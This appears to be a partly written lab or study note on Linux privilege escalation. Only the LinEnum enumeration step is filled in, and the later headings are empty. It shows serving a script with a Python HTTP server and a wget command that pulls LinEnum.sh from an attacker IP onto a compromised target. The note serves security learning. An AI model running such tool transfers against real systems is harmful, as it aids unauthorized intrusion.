# Linux Privilege Escalation

## Enumeration

### LINENUM  

[Get Linenum](!https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)  

Gain access to the target machine

[Logged In](assets/Linux-PrivEsc-01-LinEnum-01.png)

Open a simple server on the attacking device in the directory from where LinEnum can be transported.

`:> python3 -m http.server 8888`

[Python Server](assets/Linux-PrivEsc-01-LinEnum-02.png)  

On the target device, set up a location from where the script will run.  

[Target Locationls](assets/Linux-PrivEsc-01-LinEnum-03.png)  

Pull the script from the python server to the target device.  

`:> wget 10.201.47.243:8888/LinEnum.sh`

The serving attacker logs the "GET" request and the target device recevies the script

[wget LinEnum](assets/Linux-PrivEsc-01-LinEnum-04a.png)  

If the target device is permitted a WAN connection, pull the script from GitHub.

`:> wget -O LinEnumFromGit.sh https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh`  




## SUID/GUID 

## Writeable /etc/passwd files

## Escaping the Vi editor

## Exploit Crontab

## Exploiting the PATH variable